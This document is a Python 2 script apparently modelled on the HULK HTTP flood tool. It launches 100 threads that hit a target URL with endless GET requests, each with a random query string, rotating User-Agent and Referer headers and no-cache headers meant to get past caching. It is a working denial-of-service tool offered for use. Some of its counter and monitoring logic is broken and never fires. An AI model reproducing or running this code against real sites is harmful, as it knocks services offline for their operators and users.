import urllib2
import sys
import threading
import random
import re
from headers import get_user_agents, get_referers

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
    global request_counter
    request_counter+=9999

def set_flag(val):
    global flag
    flag=val

def set_safe():
    global safe
    safe=1

def useragent_list():
    global headers_useragents
    headers_useragents = get_user_agents()
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers = get_referers()
    return headers_referers

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

def usage():
    print 'Usage: python ' + sys.argv[0] + ' <url>'
    print 'Example: python ' + sys.argv[0] + ' http://www.example.com'

def httpcall(url):
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
    try:
        urllib2.urlopen(request)
    except urllib2.HTTPError, e:
        code = e.code
    except urllib2.URLError, e:
        code = e.code
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag<2:
                code=0
                if code == 0:
                    httpcall(url)
                else:
                    break
        except:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        try:
            while flag==0:
                if (request_counter/1000) > request_counter/1000.00 and request_counter/1000.00 > request_counter/1000:
                    print request_counter/1000.00, 'req/sec'
                pass
        except:
            pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    try:
        if sys.argv[1].count('/')==2:
            url = sys.argv[1]
        else:
            url = 'http://' + sys.argv[1]
        host = re.search('https?://([^/]+)', url).group(1)
        print '[+] Target:', url
        print '[+] Host:', host
        print '[+] Starting...'
        print '[+] Press Ctrl+C to stop'
        for i in range(100):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
        while flag==0:
            try:
                input()
            except:
                break
    except KeyboardInterrupt:
        set_flag(2)
        print '\n[+] Stopped'
        sys.exit() 